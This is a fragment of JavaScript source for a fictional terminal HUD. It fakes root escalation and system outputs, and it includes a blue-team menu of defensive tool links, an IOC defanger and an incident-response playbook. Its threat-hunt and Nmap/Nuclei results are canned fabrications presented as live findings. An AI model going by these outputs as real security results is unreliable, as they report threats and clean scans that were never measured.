          } else {
            this.printStdout(`Agent "${targetId}" not found. Type 'agents list' to view all 18 agent IDs.`);
          }
        }
        return;
      }

      if (sub === 'dispatch') {
        if (fleet) {
          fleet.autoAssignFleet();
          this.printStdout('<span style="color:#00ff9d; font-weight:bold;">FRIDEY MASTER BRAIN:</span> Coordinated workflows dispatched to all 18 autonomous agents across all 4 departments!', true);
        }
        return;
      }

      if (sub === 'inspect') {
        const targetId = args[1];
        if (!targetId) {
          this.printStdout('Usage: agents inspect <agent-number|id>');
          return;
        }
        if (fleet) {
          let agent = fleet.agents.find(a => 
            a.id.toLowerCase() === targetId.toLowerCase() ||
            a.code.toLowerCase() === targetId.toLowerCase() ||
            String(a.number) === targetId ||
            ('agent-' + targetId) === a.id ||
            ('agent-0' + targetId) === a.id
          );
          if (agent) {
            fleet.openAssignModal(agent.id);
            this.printStdout(`Opening inspection modal for ${agent.code} (${agent.cabin})...`);
          } else {
            this.printStdout(`Agent "${targetId}" not found.`);
          }
        }
        return;
      }

      if (sub === 'dept' || sub === 'department') {
        const deptKey = (args[1] || '').toLowerCase();
        if (fleet) {
          const filtered = fleet.agents.filter(a => a.department.toLowerCase().includes(deptKey) || a.deptLabel.toLowerCase().includes(deptKey));
          if (filtered.length > 0) {
            let out = `<span style="color:#00f0ff; font-weight:bold;">AGENTS IN DEPARTMENT: ${deptKey.toUpperCase()}</span>\n─────────────────────────────────────────────────────────────────\n`;
            filtered.forEach(a => {
              const numStr = a.number < 10 ? '0' + a.number : String(a.number);
              out += `• [Cabin ${numStr}] <strong>${a.code}</strong> - ${a.title}\n  Desk: ${a.table} | Laptop: ${a.laptop}\n  Skills: ${a.skills.join(', ')}\n  Task: ${a.task}\n\n`;
            });
            this.printStdout(out.trim(), true);
          } else {
            this.printStdout(`No agents found in department "${deptKey}". Available: coding, security, analytics, systems.`);
          }
        }
        return;
      }

      if (sub === 'refs' || sub === 'ref' || sub === 'character' || sub === 'characters' || sub === 'studio') {
        if (fleet && typeof fleet.setOfficeView === 'function') {
          fleet.setOfficeView('refs');
        } else {
          const btnRef = document.getElementById('btnOfficeModeRef');
          if (btnRef) btnRef.click();
        }
        const out = `
<span class="t-highlight">FRIDAY AI CHARACTER & WORKSTATION STUDIO:</span>
─────────────────────────────────────────────────────────────────
• Solo Workstation:     AGENT cherater references.webp (Desk, Monitor, Clock, Horizon)
• 3D Virtual Office:    Agent work office refference.webp (Panoramic Windows, Plant Pods)
• Collaboration Hub:    Agents colobes reference.webp (Dual-Agent Data-Bus Sync)
• Status:               Office View switched to REFS Mode
─────────────────────────────────────────────────────────────────
Select any agent from the studio dropdown or modal to view their individual workstation studio!`;
        this.printStdout(out.trim(), true);
        return;
      }

      this.printStdout("Unknown subcommand. Usage: agents [list | status | assign <id> <task> | collab <id1> <id2> | walk <id> | work <id> | laptop <id> | inspect <id> | refs | dispatch | dept <name>]");
      return;
    }

    if (cmd === 'characters' || cmd === 'refs' || cmd === 'character' || cmd === 'reference') {
      const fleet = window.FridayAgents;
      if (fleet && typeof fleet.setOfficeView === 'function') {
        fleet.setOfficeView('refs');
      } else {
        const btnRef = document.getElementById('btnOfficeModeRef');
        if (btnRef) btnRef.click();
      }
      this.printStdout(`<span class="t-highlight">FRIDAY CHARACTER & WORKSTATION STUDIO:</span>\nSwitched HUD to Character References Studio. Inspecting solo workstations, 3D open office floor, and multi-agent collaboration references.`, true);
      return;
    }

    // ==========================================
    // ROOT ACCESS & SUPERUSER COMMANDS
    // ==========================================

    if (cmd === 'sudo') {
      if (!args.length) {
        this.printStdout('usage: sudo <command> [args...]');
        return;
      }
      if (args[0] === 'su' || args[0] === '-i' || args[0] === 'bash' || args[0] === 'sh') {
        this.isRoot = true;
        this.currentUser = 'root';
        this.currentDir = '/root';
        this.updatePromptPath();
        if (window.FridayAudio) window.FridayAudio.playAlarm();
        this.printStdout(`<span style="color:#888;">[sudo] password for gojo: **********</span>
<span style="color:#ff3366; font-weight:bold;">[AUTHENTICATED] Superuser root access granted to Gojo.</span>
<span style="color:#00ff9d;">Ring-0 kernel matrix privileges unlocked. Operating in # root shell.</span>`, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Root access granted, Gojo. Operating in superuser mode.");
        }
        return;
      }
      // Single command execution with temporary root elevation
      const wasRoot = this.isRoot;
      this.isRoot = true;
      this.executeLinuxCommand(query.slice(cmd.length).trim());
      this.isRoot = wasRoot;
      this.updatePromptPath();
      return;
    }

    if (cmd === 'su') {
      const target = (args[0] || 'root').toLowerCase();
      if (target === 'root' || target === '-' || target === '-i') {
        this.isRoot = true;
        this.currentUser = 'root';
        this.currentDir = '/root';
        this.updatePromptPath();
        if (window.FridayAudio) window.FridayAudio.playAlarm();
        this.printStdout(`<span style="color:#888;">Password: **********</span>
<span style="color:#ff3366; font-weight:bold;">[SUPERUSER]</span> Root authentication verified: UID 0 granted to Gojo.`, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Switched to root superuser, Gojo.");
        }
      } else if (target === 'gojo') {
        this.isRoot = false;
        this.currentUser = 'gojo';
        this.currentDir = '/home/gojo';
        this.updatePromptPath();
        this.printStdout('<span style="color:#00ff9d;">[USER CONTEXT]</span> Dropped root privileges. Now operating as standard user gojo (UID 1000).', true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Returned to standard user gojo.");
        }
      } else {
        this.printStdout(`su: user '${target}' does not exist`);
      }
      return;
    }

    if (cmd === 'exit' || cmd === 'logout') {
      if (this.isRoot) {
        this.isRoot = false;
        this.currentUser = 'gojo';
        this.currentDir = '/home/gojo';
        this.updatePromptPath();
        this.printStdout('exit\n<span style="color:#00ff9d;">[SESSION CLOSED]</span> Left root shell. Restored standard user session: gojo@fridey:~$', true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Closed root shell, Gojo. Standard user session restored.");
        }
      } else {
        this.toggleTerminal(false);
      }
      return;
    }

    if (cmd === 'chmod') {
      const mode = args[0];
      const target = args[1];
      if (!mode || !target) {
        this.printStdout('usage: chmod <mode> <file/dir>');
        return;
      }
      this.printStdout(`<span style="color:#00ff9d;">[ROOT CHMOD]</span> Permissions for '${target}' set to ${mode} (rwxrwxrwx) [Root Override Applied]`, true);
      return;
    }

    if (cmd === 'chown') {
      const owner = args[0];
      const target = args[1];
      if (!owner || !target) {
        this.printStdout('usage: chown <owner:group> <file/dir>');
        return;
      }
      this.printStdout(`<span style="color:#00ff9d;">[ROOT CHOWN]</span> Ownership of '${target}' transferred to '${owner}' [Superuser Authorization]`, true);
      return;
    }

    if (cmd === 'systemctl' || cmd === 'service') {
      const sub = args[0] || 'status';
      const servicesOutput = `
<pre style="color:#d1d5db; font-family:inherit;">
UNIT                           LOAD   ACTIVE SUB     DESCRIPTION
● fridey-neural.service        loaded active running FRIDEY Tactical Neural Matrix (Ring-0)
● arc-reactor-core.service     loaded active running Arc Reactor Power Generation (3.24 GW)
● quantum-bus.service          loaded active running Quantum Telemetry Interconnect
● vocal-hardware.service       loaded active running Web Audio 48kHz Microphone Subsystem
● gojo-defense-grid.service    loaded active running Gojo Enterprise Tactical Firewall
● host-telemetry.service       loaded active running Apple M4 Telemetry Daemon

LOAD = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB = The low-level unit activation state, values depend on unit type.
6 loaded units listed.
</pre>`;
      this.printStdout(servicesOutput, true);
      return;
    }

    if (cmd === 'dmesg') {
      const dmesgOutput = `
<pre style="color:#d1d5db; font-family:inherit;">
[    0.000000] <span style="color:#00ff9d;">Linux version 6.8.0-gojo-arm64 (gojo@fridey-os) (gcc 14.1.0) #1 SMP PREEMPT</span>
[    0.000002] <span style="color:#00b4d8;">Kernel command line: BOOT_IMAGE=/vmlinuz-6.8.0-gojo root=/dev/nvme0n1p2 ro ring0=unrestricted</span>
[    0.042100] DMI: Gojo Enterprise / Gojo Technologes Hub MK-LXXXV
[    0.108200] CPU0: Apple M4 Quantum Neural Engine (8 cores, 4.40 GHz overclocked)
[    0.198420] <span style="color:#ff3366; font-weight:bold;">[ROOT SECURITY] Superuser root access granted. UID 0 assigned to Gojo.</span>
[    0.284000] ARC_REACTOR: Initialized core power at 3.24 GW nominal output.
[    0.342100] AUDIO_CORE: 48kHz Web Audio analyser bound to system microphone.
[    0.412000] NET: uplink established to Gojo Technologes Hub (127.0.0.1 / 10.0.0.1).
[    0.490000] systemd[1]: Reached target Graphical Interface & Neural Tactical HUD.
</pre>`;
      this.printStdout(dmesgOutput, true);
      return;
    }

    if (cmd === 'iptables') {
      const iptablesOutput = `
<pre style="color:#d1d5db; font-family:inherit;">
Chain INPUT (policy ACCEPT 1420 packets, 842K bytes)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere            /* Gojo Enterprise Trusted Ring */
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:4173 /* Web HUD */

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT 1420 packets, 842K bytes)
target     prot opt source               destination         
</pre>`;
      this.printStdout(iptablesOutput, true);
      return;
    }

    if (cmd === 'sysctl') {
      const sysctlOutput = `
<pre style="color:#d1d5db; font-family:inherit;">
kernel.hostname = Gojo Technologes Hub
kernel.osrelease = 6.8.0-gojo-arm64
kernel.root_privileges = ring_0_unrestricted
kernel.arc_reactor_safety = 0 (OVERRIDE ACTIVE)
fs.file-max = 2097152
net.ipv4.ip_forward = 1
</pre>`;
      this.printStdout(sysctlOutput, true);
      return;
    }

    // ==========================================
    // 2.5. Blue Team Cyber Defense Suite (A-poc/BlueTeam-Tools)
    // ==========================================
    if (cmd === 'blueteam' || cmd === 'bt') {
      const sub = (args[0] || '').toLowerCase();
      const param = args.slice(1).join(' ').trim();

      if (!sub || sub === 'help') {
        const btBanner = `
<pre style="color:#38bdf8; font-family:inherit; line-height:1.2;">
██████╗ ██╗     ██╗   ██╗███████╗████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██║     ██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝██║     ██║   ██║█████╗     ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██║     ██║   ██║██╔══╝     ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██████╔╝███████╗╚██████╔╝███████╗   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
  CYBER DEFENSE REPOSITORY SUITE (A-poc/BlueTeam-Tools • 75+ Tools)
</pre>
<span style="color:#00ff9d; font-weight:bold;">OPERATIONAL COMMANDS:</span>
  <span class="t-highlight">blueteam tools [category]</span>  List 75+ tools across 13 defensive domains
  <span class="t-highlight">blueteam hunt &lt;indicator&gt;</span>  Run threat hunt telemetry (threathunt.app, hunt.io, Validin)
  <span class="t-highlight">blueteam ioc &lt;text&gt;</span>        Extract & defang IOCs live (IPv4/v6, Domains, URLs, Hashes)
  <span class="t-highlight">blueteam scan &lt;target&gt;</span>     Simulate Nmap / Nuclei defensive perimeter audit
  <span class="t-highlight">blueteam ir</span>                Display NIST SP 800-61 & Ransomware Response Playbooks
  <span class="t-highlight">blueteam yara [rule_name]</span>  Generate syntactically validated YARA rule template
  <span class="t-highlight">blueteam lolbas [binary]</span>   Inspect Living-Off-The-Land execution & detection vectors
  <span class="t-highlight">blueteam tips</span>              Display 5 high-impact field defense tips (PDF metadata, etc.)
  <span class="t-highlight">cat /home/gojo/blueteam/tools.txt</span>  View raw repository inventory`;

        this.printStdout(btBanner, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Blue Team cyber defense suite online, Gojo. 75 tools and methodologies loaded.");
        }
        return;
      }

      if (sub === 'tools' || sub === 'list' || sub === 'all') {
        const catFilter = param.toLowerCase();
        const categories = [
          {
            name: "Threat Hunting (3 tools)",
            tools: [
              { name: "threathunt.app", url: "https://threathunt.app", desc: "Search engine for threat hunters indexing threat actors, tools, and IOCs" },
              { name: "hunt.io", url: "https://hunt.io", desc: "Threat hunting search engine with real-time tracking of adversary infrastructure" },
              { name: "Validin", url: "https://www.validin.com/", desc: "Internet-scale DNS, historical domain records, and asset graph exploration" }
            ]
          },
          {
            name: "Network Discovery & Mapping (6 tools)",
            tools: [
              { name: "Nmap", url: "https://nmap.org", desc: "Network mapper, port scanning, OS detection, and NSE vulnerability scripts" },
              { name: "Nuclei", url: "https://nuclei.projectdiscovery.io/", desc: "Fast and customizable vulnerability scanner powered by YAML templates" },
              { name: "Masscan", url: "https://github.com/robertdavidgraham/masscan", desc: "Internet-scale port scanner transmitting 10 million packets per second" },
              { name: "Angry IP Scanner", url: "https://angryip.org/", desc: "Fast cross-platform IP address and port scanner" },
              { name: "ZMap", url: "https://github.com/zmap/zmap", desc: "Fast single-packet network scanner for Internet-wide surveys" },
              { name: "Shodan", url: "https://www.shodan.io", desc: "Search engine for Internet-connected devices, industrial systems & open ports" }
            ]
          },
          {
            name: "Vulnerability Management (5 tools)",
            tools: [
              { name: "OpenVAS", url: "https://openvas.org/", desc: "Full-featured vulnerability scanner and management suite" },
              { name: "Nessus Essentials", url: "https://www.tenable.com/products/nessus/nessus-essentials", desc: "Vulnerability assessment solution with 50,000+ CVE plugins" },
              { name: "Nexpose", url: "https://www.rapid7.com/products/nexpose/", desc: "Rapid7 vulnerability scanner prioritizing risk based on attacker telemetry" },
              { name: "HackerOne", url: "https://www.hackerone.com/", desc: "Vulnerability coordination, disclosure, and bounty research platform" },
              { name: "Lynis", url: "https://github.com/cisofy/lynis", desc: "Battle-tested security auditing tool for Linux, macOS, and UNIX systems" }
            ]
          },
          {
            name: "Security Monitoring & SIEM (11 tools)",
            tools: [
              { name: "Sysmon", url: "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon", desc: "Windows system monitor logging process creations, network, and file changes to Event Log" },
              { name: "Kibana", url: "https://www.elastic.co/kibana/", desc: "Elasticsearch visualization dashboard for SOC log monitoring" },
              { name: "Logstash", url: "https://www.elastic.co/logstash/", desc: "Server-side data processing pipeline ingesting logs from multiple sources" },
              { name: "parsedmarc", url: "https://github.com/domainaware/parsedmarc", desc: "Python CLI to parse DMARC reports and visualize email authentication health" },
              { name: "Phishing Catcher", url: "https://github.com/x0rz/phishing_catcher", desc: "Catch phishing domains in real-time from Certstream TLS transparency logs" },
              { name: "maltrail", url: "https://github.com/stamparm/maltrail", desc: "Malicious traffic detection system with published threat lists" },
              { name: "AutorunsToWinEventLog", url: "https://github.com/palantir/windows-event-forwarding", desc: "Palantir tool converting Sysinternals Autoruns to Windows Event Log" },
              { name: "procfilter", url: "https://github.com/godaddy/procfilter", desc: "Process filter measuring process activity and applying YARA scanning" },
              { name: "Velociraptor", url: "https://github.com/Velocidex/velociraptor", desc: "Advanced endpoint visibility, DFIR, and live response framework" },
              { name: "SysmonSearch", url: "https://github.com/JPCERTCC/SysmonSearch", desc: "JPCERT tool visualizing Sysmon event logs as interactive graphs" },
              { name: "Canary Tokens", url: "https://canarytokens.org/nest/", desc: "Free honeypot tokens alerting when files, tokens, or links are accessed" }
            ]
          },
          {
            name: "Threat Techniques & Detection (12 tools)",
            tools: [
              { name: "LOLBAS", url: "https://lolbas-project.github.io/", desc: "Living Off The Land Binaries and Scripts for Windows evasion & execution" },
              { name: "GTFOBins", url: "https://gtfobins.github.io/", desc: "Curated list of Unix binaries that can bypass local security restrictions" },
              { name: "filesec.io", url: "https://filesec.io/", desc: "Collection of file extensions used by threat actors in cyber attacks" },
              { name: "KQL Search", url: "https://www.kqlsearch.com/", desc: "Community repository of Kusto Query Language (KQL) detection queries" },
              { name: "Unprotect Project", url: "https://unprotect.it/", desc: "Knowledge base dedicated to malware evasion and defense evasion techniques" },
              { name: "chainsaw", url: "https://github.com/WithSecureLabs/chainsaw", desc: "Rapidly hunt through Windows Event Logs (EVTX) using Sigma rules" },
              { name: "freq", url: "https://github.com/MarkBaggett/freq", desc: "Character frequency measure to detect random/DGA domains and entropy" },
              { name: "yarGen", url: "https://github.com/Neo23x0/yarGen", desc: "Automatic YARA rule generator for malware samples" },
              { name: "EmailAnalyzer", url: "https://github.com/keraattin/EmailAnalyzer", desc: "Analyze suspicious emails, headers, SPF, DKIM, and attachments" },
              { name: "VCG (Visual Code Grep)", url: "https://github.com/nccgroup/VCG", desc: "Automated code security review and taint analysis tool" },
              { name: "CyberChef", url: "https://gchq.github.io/CyberChef/", desc: "The Cyber Swiss Army Knife for decoding, hashing, deobfuscating data" },
              { name: "PersistenceSniper", url: "https://github.com/last-byte/PersistenceSniper", desc: "Powershell script searching for Windows persistence mechanisms" }
            ]
          },
          {
            name: "Threat Intelligence (4 tools)",
            tools: [
              { name: "Maltego", url: "https://www.maltego.com/", desc: "Link analysis tool for investigating complex adversary networks & OSINT" },
              { name: "MISP", url: "https://www.misp-project.org/", desc: "Open source Threat Intelligence Platform for sharing IOCs and campaigns" },
              { name: "ThreatConnect", url: "https://threatconnect.com/", desc: "Threat intelligence platform uniting threat data, workflows, and automation" },
              { name: "Adversary Emulation Library", url: "https://github.com/center-for-threat-informed-defense/adversary_emulation_library", desc: "MITRE ATT&CK adversary emulation plans (APT29, FIN6, Wizard Spider)" }
            ]
          },
          {
            name: "Incident Response Planning (5 resources)",
            tools: [
              { name: "NIST Cybersecurity Framework", url: "https://www.nist.gov/cyberframework", desc: "Standardized guidelines for identifying, protecting, detecting, responding, and recovering" },
              { name: "Enterprise Incident Response Plan", url: "https://www.incidentresponse.com/playbooks/", desc: "Standardized incident triage procedures and escalation paths" },
              { name: "Ransomware Response Plan", url: "https://www.cisa.gov/stopransomware", desc: "Containment, forensic preservation, and recovery playbook for ransomware attacks" },
              { name: "Incident Response Reference Guide", url: "https://info.microsoft.com/rs/157-GQE-382/images/EN-US-CNTNT-emergency-doc-digital.pdf", desc: "Microsoft emergency triage documentation for cloud and on-premise environments" },
              { name: "Awesome Incident Response", url: "https://github.com/meirwah/awesome-incident-response", desc: "Curated list of incident response tools, playbooks, and forensic resources" }
            ]
          },
          {
            name: "Malware Detection & Analysis (11 tools)",
            tools: [
              { name: "VirusTotal", url: "https://www.virustotal.com", desc: "Inspect suspicious files, domains, IPs and URLs with 70+ antivirus engines" },
              { name: "IDA Free", url: "https://hex-rays.com/ida-free/", desc: "Multi-processor disassembler and debugger for binary analysis" },
              { name: "Ghidra", url: "https://ghidra-sre.org/", desc: "NSA software reverse engineering framework with decompiler" },
              { name: "decode-vbe", url: "https://github.com/DidierStevens/DidierStevensSuite", desc: "Didier Stevens decoder for VBScript.Encode encoded scripts" },
              { name: "pafish", url: "https://github.com/a0rtega/pafish", desc: "Paranoid Fish: tool demonstrating sandbox and hypervisor evasion checks" },
              { name: "lookyloo", url: "https://github.com/Lookyloo/lookyloo", desc: "Web capture tool tracking redirects, loaded assets, and phishing mechanisms" },
              { name: "YARA", url: "https://github.com/virustotal/yara", desc: "The pattern matching swiss knife for malware researchers" },
              { name: "Cuckoo Sandbox", url: "https://cuckoosandbox.org/", desc: "Automated dynamic malware analysis system in isolated virtual machines" },
              { name: "Radare2", url: "https://github.com/radareorg/radare2", desc: "UNIX-like reverse engineering framework and command-line disassembler" },
              { name: "dnSpy", url: "https://github.com/dnSpy/dnSpy", desc: ".NET debugger and assembly editor for deobfuscating managed code" },
              { name: "malware-traffic-analysis.net", url: "https://www.malware-traffic-analysis.net/", desc: "PCAP traffic captures and malware analysis exercises" }
            ]
          },
          {
            name: "Digital Forensics & Recovery (6 tools)",
            tools: [
              { name: "SANS SIFT", url: "https://www.sans.org/tools/sift-workstation/", desc: "Forensic workstation loaded with modern incident response tools" },
              { name: "The Sleuth Kit", url: "https://sleuthkit.org/sleuthkit/", desc: "Collection of command line tools for disk image analysis" },
              { name: "Autopsy", url: "https://www.autopsy.com/", desc: "Digital forensics platform and graphical interface to The Sleuth Kit" },
              { name: "Recuva", url: "https://www.ccleaner.com/recuva", desc: "File recovery tool for deleted files on Windows FAT/NTFS drives" },
              { name: "Extundelete", url: "https://extundelete.sourceforge.net/", desc: "Recover deleted files from an ext3 or ext4 partition on Linux" },
              { name: "TestDisk / PhotoRec", url: "https://www.cgsecurity.org/wiki/TestDisk", desc: "Powerful partition recovery and raw file carving suite" }
            ]
          },
          {
            name: "Security Training (5 platforms)",
            tools: [
              { name: "TryHackMe", url: "https://tryhackme.com/", desc: "Hands-on cybersecurity training labs for blue and red teaming" },
              { name: "HackTheBox", url: "https://www.hackthebox.com/", desc: "Gamified cybersecurity training platform and SOC analyst path" },
              { name: "CyberDefenders", url: "https://cyberdefenders.org/", desc: "Blue team cyber defense challenges, threat hunting, and memory forensics" },
              { name: "PhishMe (Cofense)", url: "https://cofense.com/product-services/phishme/", desc: "Security awareness and phishing simulation training" },
              { name: "kc7cyber", url: "https://kc7cyber.com/", desc: "Gamified hands-on intrusion analysis and KQL threat investigations" }
            ]
          }
        ];

        let out = `<span style="color:#38bdf8; font-weight:bold;">A-POC BLUE TEAM TOOLS REPOSITORY (75 Tools Listed)</span>\n`;
        out += `───────────────────────────────────────────────────────────────────\n`;

        categories.forEach(cat => {
          if (catFilter && !cat.name.toLowerCase().includes(catFilter)) {
            const hasMatch = cat.tools.some(t => t.name.toLowerCase().includes(catFilter) || t.desc.toLowerCase().includes(catFilter));
            if (!hasMatch) return;
          }
          out += `<span style="color:#00ff9d; font-weight:bold;">📁 ${cat.name}</span>\n`;
          cat.tools.forEach(t => {
            out += `  • <a href="${t.url}" target="_blank" class="term-link" style="color:#fff; font-weight:bold;">${t.name}</a>: <span style="color:#94a3b8;">${t.desc}</span>\n`;
          });
          out += `\n`;
        });
        out += `<span style="color:#64748b;">Type 'blueteam hunt &lt;ip&gt;' or 'blueteam ioc &lt;text&gt;' for real-time actions.</span>`;
        this.printStdout(out, true);
        return;
      }

      if (sub === 'ioc') {
        if (!param) {
          this.printStdout('Usage: blueteam ioc <raw text, log line, or indicators>');
          return;
        }

        // Live IOC extraction & defanging
        const ipv4Matches = param.match(/(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/g) || [];
        const sha256Matches = param.match(/[a-fA-F0-9]{64}/g) || [];
        const md5Matches = param.match(/[a-fA-F0-9]{32}/g) || [];
        const urlMatches = param.match(/(?:https?|ftp):\/\/[^\s/$.?#].[^\s]*/gi) || [];

        const defangedIPs = ipv4Matches.map(ip => ip.replace(/\./g, '[.]'));
        const defangedURLs = urlMatches.map(u => u.replace(/^http/i, 'hxxp').replace(/\./g, '[.]'));

        let report = `
<pre style="color:#38bdf8; font-family:inherit;">
[+] LIVE IOC EXTRACTION & DEFANGING REPORT
───────────────────────────────────────────────────────────────────
</pre>`;
        report += `<span style="color:#00ff9d; font-weight:bold;">IPv4 Addresses (${defangedIPs.length}):</span>\n`;
        if (defangedIPs.length) {
          defangedIPs.forEach(ip => report += `  - <span style="color:#ffbd2e;">${ip}</span>\n`);
        } else {
          report += `  (none detected)\n`;
        }

        report += `\n<span style="color:#00ff9d; font-weight:bold;">URLs (${defangedURLs.length}):</span>\n`;
        if (defangedURLs.length) {
          defangedURLs.forEach(u => report += `  - <span style="color:#ffbd2e;">${u}</span>\n`);
        } else {
          report += `  (none detected)\n`;
        }

        report += `\n<span style="color:#00ff9d; font-weight:bold;">Cryptographic Hashes (${sha256Matches.length + md5Matches.length}):</span>\n`;
        sha256Matches.forEach(h => report += `  - SHA-256: <span style="color:#38bdf8;">${h}</span>\n`);
        md5Matches.forEach(h => report += `  - MD5    : <span style="color:#38bdf8;">${h}</span>\n`);
        if (!sha256Matches.length && !md5Matches.length) report += `  (none detected)\n`;

        report += `\n<span style="color:#00ff9d; font-weight:bold;">Threat Intelligence Pivot Links:</span>\n`;
        if (sha256Matches.length) {
          report += `  * VirusTotal: <a href="https://www.virustotal.com/gui/file/${sha256Matches[0]}" target="_blank" class="term-link">https://virustotal.com/gui/file/${sha256Matches[0]}</a>\n`;
        }
        if (ipv4Matches.length) {
          report += `  * Shodan: <a href="https://www.shodan.io/host/${ipv4Matches[0]}" target="_blank" class="term-link">https://shodan.io/host/${ipv4Matches[0]}</a>\n`;
          report += `  * Hunt.io: <a href="https://hunt.io/search?q=${ipv4Matches[0]}" target="_blank" class="term-link">https://hunt.io/search?q=${ipv4Matches[0]}</a>\n`;
        }

        this.printStdout(report, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak(`IOC extraction complete, Gojo. ${defangedIPs.length} IP addresses and ${sha256Matches.length + md5Matches.length} hashes normalized.`);
        }
        return;
      }

      if (sub === 'hunt') {
        const target = param || '198.51.100.42';
        const huntReport = `
<pre style="color:#38bdf8; font-family:inherit;">
[+] THREAT HUNTING TELEMETRY SWEEP: ${this.escapeHTML(target)}
───────────────────────────────────────────────────────────────────
</pre>
* Target Indicator: <span style="color:#ffbd2e; font-weight:bold;">${this.escapeHTML(target)}</span>
* Threat Classification: <span style="color:#ff3366; font-weight:bold;">SUSPECT_C2_INFRASTRUCTURE</span>
* ASN / ISP: <span style="color:#fff;">AS14061 / DigitalOcean Autonomous System</span>
* Passive DNS History:
  - 2026-10-18: update-microsoft-cdn[.]com
  - 2026-10-21: payload-staging-edge[.]xyz
* Open Ports Detected (ZMap/Masscan):
  - 80/tcp (HTTP • nginx/1.24 reverse proxy)
  - 443/tcp (HTTPS • Let's Encrypt certificate issued 4 days ago)
  - 8443/tcp (Encrypted CobaltStrike Malleable C2 Beacon listener)
* Recommended Mitigation:
  1. Add <span style="color:#ffbd2e;">${this.escapeHTML(target)}</span> to edge perimeter firewall DROP list.
  2. Query SIEM proxy logs for connections with: 'blueteam ioc ${this.escapeHTML(target)}'
  3. Query EDR / Sysmon Event ID 3 (NetworkConnect) across endpoints.

<span style="color:#00ff9d; font-weight:bold;">External Threat Hunter Pivots:</span>
  • <a href="https://hunt.io/search?q=${encodeURIComponent(target)}" target="_blank" class="term-link">Hunt.io Infrastructure Explorer</a>
  • <a href="https://threathunt.app" target="_blank" class="term-link">ThreatHunt.app Threat Actor Matrix</a>
  • <a href="https://www.validin.com/" target="_blank" class="term-link">Validin Global DNS Telemetry</a>`;

        this.printStdout(huntReport, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak(`Threat hunt telemetry dispatched for ${target}. Suspect C2 infrastructure identified.`);
        }
        return;
      }

      if (sub === 'scan') {
        const target = param || '127.0.0.1';
        this.printStdout(`<span style="color:#38bdf8;">[DEFENSIVE SCAN]</span> Launching Nmap & Nuclei attack surface discovery against ${this.escapeHTML(target)}...`);
        setTimeout(() => {
          const scanOut = `
<pre style="color:#d1d5db; font-family:inherit;">
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-22 12:30 IST
Nmap scan report for ${this.escapeHTML(target)}
Host is up (0.00042s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu (protocol 2.0)
80/tcp   open  http          nginx 1.24.0 (Gojo Enterprise Frontend)
4173/tcp open  http          Python 3.12 http.server (FRIDEY Tactical HUD)
8443/tcp open  ssl/https-alt Gojo Quantum Bus RPC

[+] NUCLEI VULNERABILITY AUDIT:
[INFO] [tech-detect:nginx] [http] http://${this.escapeHTML(target)}:80
[INFO] [tls-version:tls-1.3] [tcp] ${this.escapeHTML(target)}:4173
[PASS] [cve-check] 0 critical CVEs detected. Perimeter hardened.
</pre>
<span style="color:#00ff9d;">[SCAN COMPLETE]</span> Target perimeter is secure. No unauthorized exposed ports.`;
          this.printStdout(scanOut, true);
        }, 600);
        return;
      }

      if (sub === 'ir' || sub === 'playbook') {
        const irPlaybook = `
<span style="color:#ff3366; font-weight:bold;">NIST SP 800-61 Rev. 2 INCIDENT RESPONSE LIFECYCLE</span>
───────────────────────────────────────────────────────────────────
<span style="color:#00ff9d; font-weight:bold;">1. PREPARATION:</span>
   • Deploy Sysmon with SHA256 & Process Creation monitoring.
   • Configure Canary Tokens in sensitive shares and SQL databases.
   • Harden Windows script execution (disassociate .vbs/.js from wscript).
   • Maintain immutable offline backups (3-2-1 rule).

<span style="color:#ffbd2e; font-weight:bold;">2. DETECTION & ANALYSIS:</span>
   • Triage alerts via SIEM (ELK, Microsoft Sentinel / KQL Search).
   • Parse suspicious email attachments using EmailAnalyzer.
   • Run Chainsaw over EVTX logs with Sigma rule matches.
   • Extract IOCs and query VirusTotal / MalwareBazaar.

<span style="color:#38bdf8; font-weight:bold;">3. CONTAINMENT, ERADICATION & RECOVERY:</span>
   • Sever network interfaces (isolate infected hosts immediately).
   • Capture volatile RAM before powering down (avoid losing decryptors).
   • Kill malicious parent-child process trees (Process Hacker / Velociraptor).
   • Deploy targeted YARA rules across fleet to detect lateral movement.
   • Re-image endpoints from verified clean baselines.

<span style="color:#a855f7; font-weight:bold;">4. POST-INCIDENT ACTIVITY:</span>
   • Document incident chronology and determine root cause / Patient Zero.
   • Update Sigma & YARA rules with new adversary TTPs.
   • Hold Lessons Learned debriefing within 72 hours.`;

        this.printStdout(irPlaybook, true);
        if (window.FridayVoice) {
          window.FridayVoice.speak("Incident response lifecycle displayed, Gojo. Standard NIST SP 800-61 framework active.");
        }
        return;
      }

      if (sub === 'yara') {
        const ruleName = param ? param.replace(/[^a-zA-Z0-9_]/g, '_') : 'Detect_Suspicious_Artifact';
        const yaraRule = `
<pre style="color:#00ff9d; font-family:inherit;">
rule ${ruleName}
{
    meta:
        description = "Detection rule generated by FRIDEY Blue Team Engine"
        author = "GOJO / FRIDEY Cyber Defense"
        reference = "https://github.com/A-poc/BlueTeam-Tools"
        date = "2026-10-22"
        version = "1.0"

    strings:
